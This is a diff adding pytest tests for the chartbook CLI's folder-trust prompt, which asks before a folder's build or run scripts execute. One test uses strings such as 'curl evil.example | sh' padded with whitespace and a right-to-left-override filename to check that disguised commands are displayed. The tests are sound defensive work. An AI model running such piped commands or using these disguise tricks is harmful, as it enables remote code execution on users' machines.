@@ -97,7 +97,8 @@ class TestBuilding:
         result = CliRunner().invoke(main, ["build", "./docs", "-f"], input="r\n")
         assert result.exit_code == 0, result.output
         assert "Trust this folder? [y/r/N]" in result.output
-        assert "The build command was not run; the site is rendered without the folder's code." in result.output
+        assert "The build command was not run; only the site is rendered." in result.output
+        assert "rendered as files from a store are, as you answered" in result.output
         assert result.output.count("Trust this folder?") == 1  # the render does not ask again
         assert (project / "docs" / "index.html").exists() and not (project / "ran.log").exists()
         assert _recorded() == []
@@ -213,3 +214,130 @@ class TestWhoIsAsked:
         assert "`chartbook trust`" in result.output and not (folder / "ran.log").exists()
 
 
+
+
+class TestWhatTheReviewFound:
+    """Each found by the adversarial review of the prompt, and fixed."""
+
+    def test_a_closed_stdin_or_stderr_is_no_terminal(self, monkeypatch):
+        import sys
+
+        monkeypatch.setattr(sys, "stdin", None)
+        monkeypatch.setattr(sys, "stderr", None)
+        assert cli._stdin_is_a_terminal() is False and cli._stderr_is_a_terminal() is False
+
+    def test_a_build_of_files_from_a_store_is_never_asked(self, monkeypatch):
+        monkeypatch.setattr(cli, "_can_ask", _real_can_ask)
+        monkeypatch.setattr(cli, "_stdin_is_a_terminal", lambda: True)
+        monkeypatch.setattr(cli, "_stderr_is_a_terminal", lambda: True)
+        monkeypatch.setenv(config.UNTRUSTED_ENV_VAR, "1")
+        assert cli._can_ask() is False
+
+    def test_chartbook_batch_0_is_not_a_batch_run(self, monkeypatch):
+        monkeypatch.setattr(cli, "_can_ask", _real_can_ask)
+        monkeypatch.setattr(cli, "_stdin_is_a_terminal", lambda: True)
+        monkeypatch.setattr(cli, "_stderr_is_a_terminal", lambda: True)
+        monkeypatch.setenv("CHARTBOOK_BATCH", "0")
+        assert cli._can_ask() is True
+
+    @pytest.fixture
+    def mixed_catalog(self, tmp_path):
+        for name in ("a", "b"):
+            _scripted(tmp_path / name)
+        config.record_trust(tmp_path / "b", "render")
+        catalog = tmp_path / "catalog"
+        catalog.mkdir()
+        (catalog / "chartbook.toml").write_text(
+            tomli_w.dumps({"project": {"type": "catalog"}, "pipelines": {"a": {"path": "../a"}, "b": {"path": "../b"}}})
+        )
+        config.record_trust(catalog, "run")
+        return catalog
+
+    def test_a_catalog_build_asks_once_about_a_member_trusted_to_render_too(self, mixed_catalog, monkeypatch):
+        monkeypatch.chdir(mixed_catalog)
+        result = CliRunner().invoke(main, ["build", "./site", "-f"], input="y\n")
+        assert result.output.count("Trust them?") == 1, result.output
+        assert {Path(e["path"]).name: e["level"] for e in _recorded()} == {"a": "run", "b": "run", "catalog": "run"}
+
+    def test_r_on_a_folder_trusted_to_render_renders_it_as_it_always_does(self, tmp_path, monkeypatch):
+        project = create_pipeline_project(tmp_path)
+        with open(project / "chartbook.toml", "a") as f:
+            f.write('\n[scripts]\nbuild = "echo ran > ran.log"\n')
+        config.record_trust(project, "render")
+        monkeypatch.chdir(project)
+        seen = {}
+        real = cli._run_docs_build
+
+        def recording(*args, **kwargs):
+            seen["mode"] = os.environ.get(config.UNTRUSTED_ENV_VAR)
+            return real(*args, **kwargs)
+
+        monkeypatch.setattr(cli, "_run_docs_build", recording)
+        result = CliRunner().invoke(main, ["build", "./docs", "-f"], input="r\n")
+        assert result.exit_code == 0, result.output
+        assert "This folder is trusted to render its site, not to run its code:" in result.output
+        assert seen["mode"] is None and not (project / "ran.log").exists()
+        assert "rendered as files from a store are" not in result.output
+
+    def test_what_a_folder_says_cannot_hide_or_reorder_the_question(self):
+        assert cli._shown_text("doit\u202e lmth.exe\u200b") == "doit<U+202E> lmth.exe<U+200B>"
+        assert cli._shown_text("a" + " " * 500 + "curl evil | sh") == "a curl evil | sh"
+        lines = cli._shown_command("\n" * 60 + "curl evil.example | sh\n" + "\n" * 60 + "doit\n")
+        assert lines == ["curl evil.example | sh", "doit"]
+        many = cli._shown_command("\n".join(f"step {n}" for n in range(30)))
+        assert len(many) == 11 and many[-1].startswith("… and 20 more line(s)")
+
+    def test_rendering_says_what_a_yes_lets_a_build_run_later(self, tmp_path, monkeypatch):
+        project = create_pipeline_project(tmp_path)
+        with open(project / "chartbook.toml", "a") as f:
+            f.write('\n[scripts]\nbuild = "make everything"\n')
+        monkeypatch.chdir(project)
+        result = CliRunner().invoke(main, ["docs", "generate", "./docs", "-f"], input="n\n")
+        assert "Trusting it also lets `chartbook build` run its build command, without asking:\n    make everything" in result.output
+        assert "trust this folder and the folders inside it" in result.output
+
+    def test_the_catalogs_own_folder_is_recorded_with_no_id(self, tmp_path, monkeypatch):
+        _scripted(tmp_path / "a")
+        catalog = tmp_path / "catalog"
+        catalog.mkdir()
+        (catalog / "chartbook.toml").write_text(tomli_w.dumps({"project": {"type": "catalog"}, "pipelines": {"a": {"path": "../a"}}}))
+        monkeypatch.chdir(catalog)
+        CliRunner().invoke(main, ["docs", "generate", "./site", "-f"], input="y\n")
+        own = [e for e in _recorded() if Path(e["path"]).name == "catalog"]
+        assert own and "id" not in own[0]
+
+    def test_a_word_that_merely_starts_with_y_is_asked_again(self, tmp_path, monkeypatch):
+        folder = _scripted(tmp_path / "rates")
+        monkeypatch.chdir(folder)
+        result = CliRunner().invoke(main, ["run"], input="yolo\nyes\n")
+        assert "Type y or n." in result.output and (folder / "ran.log").exists()
+
+    def test_each_command_asks_again_in_one_process(self, tmp_path, monkeypatch):
+        """An answer of r or n is the command's, not the process's (a library calling main twice)."""
+        project = create_pipeline_project(tmp_path)
+        monkeypatch.chdir(project)
+        CliRunner().invoke(main, ["docs", "generate", "./docs", "-f"], input="r\n")
+        again = CliRunner().invoke(main, ["docs", "generate", "./docs", "-f"], input="n\n")
+        assert "Trust this folder?" in again.output and again.exit_code == 1
+
+    def test_a_run_its_arguments_refuse_asks_nothing(self, tmp_path, monkeypatch):
+        folder = _scripted(tmp_path / "rates")
+        monkeypatch.chdir(folder)
+        result = CliRunner().invoke(main, ["run", "--frozen", "--snapshot"])
+        assert "Trust this folder?" not in result.output and "One or the other" in result.output
+        assert _recorded() == []
+
+    def test_another_script_is_named_for_what_it_is(self, tmp_path, monkeypatch):
+        folder = _scripted(tmp_path / "rates")
+        manifest = tomli.loads((folder / "chartbook.toml").read_text())
+        manifest["scripts"]["lint"] = "ruff check ."
+        (folder / "chartbook.toml").write_text(tomli_w.dumps(manifest))
+        monkeypatch.chdir(folder)
+        result = CliRunner().invoke(main, ["run", "lint"], input="n\n")
+        assert "Its 'lint' script runs on this machine:\n    ruff check ." in result.output
+
+    def test_create_data_glimpses_asks_at_the_render_gate(self, tmp_path, monkeypatch):
+        project = create_pipeline_project(tmp_path)
+        monkeypatch.chdir(project)
+        result = CliRunner().invoke(main, ["create-data-glimpses"], input="n\n")
+        assert result.exit_code == 1 and "Nothing was rendered." in result.output
